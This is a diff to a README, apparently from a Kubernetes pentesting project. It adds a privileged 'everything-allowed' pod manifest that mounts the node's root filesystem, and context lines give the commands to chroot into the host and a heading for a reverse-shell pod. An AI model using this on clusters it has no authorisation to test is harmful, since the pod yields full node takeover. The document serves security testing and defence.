@@ -3,7 +3,35 @@ If there are no pod admission controllers applied,or a really lax policy, you ca
 
 # Pod Creation
 
-### Create a pod you can exec into
+## Create a pod you can exec into
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-everything-allowed
+  labels:
+    app: everything-allowed
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed
+    image: ubuntu
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
+  #nodeName: k8s-master
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+```
 [pod-everything-allowed.yaml](pod-everything-allowed.yaml)
 
 #### Option 1: Create pod from local yaml 
@@ -21,7 +49,7 @@ kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/e
 kubectl exec -it pod-everything-allowed -- chroot /host
 ```
 
-### Or, create a reverse shell pod
+## Or, create a reverse shell pod
 [pod-everything-allowed-revshell.yaml](pod-everything-allowed-revshell.yaml)
 
 #### Set up listener
